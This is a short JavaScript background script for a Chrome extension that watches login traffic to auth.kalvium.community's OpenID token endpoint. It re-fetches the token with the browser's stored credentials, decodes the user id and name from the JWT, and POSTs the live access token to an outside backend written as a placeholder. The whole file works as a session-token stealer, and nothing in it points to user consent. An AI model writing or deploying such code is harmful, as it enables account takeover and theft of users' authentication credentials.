chrome.webRequest.onCompleted.addListener(
  async (details) => {
    if (
      details.url.includes("/auth/realms/kalvium/protocol/openid-connect/token")
    ) {
      try {
        const response = await fetch(details.url, {
          method: "GET",
          headers: {
            Accept: "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            Origin: "https://kalvium.community",
            Referer: "https://kalvium.community/",
          },
          credentials: "include",
        });

        if (response.ok) {
          const data = await response.json();
          const token = data.access_token;
          const { sub: userId, name, exp } = extractUserInfoFromToken(token);

          // Save to backend
          await fetch("YOUR_BACKEND_API/tokens", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              userId,
              token,
              name,
              expiresAt: new Date(exp * 1000),
              timestamp: new Date().toISOString(),
            }),
          });
        }
      } catch (error) {
        console.error("Error capturing token:", error);
      }
    }
  },
  { urls: ["*://auth.kalvium.community/*"] }
);

function extractUserInfoFromToken(token) {
  try {
    const payload = JSON.parse(atob(token.split(".")[1]));
    return {
      sub: payload.sub,
      name: payload.name,
      exp: payload.exp,
    };
  } catch (error) {
    console.error("Error extracting user info:", error);
    return { sub: null, name: null, exp: null };
  }
}
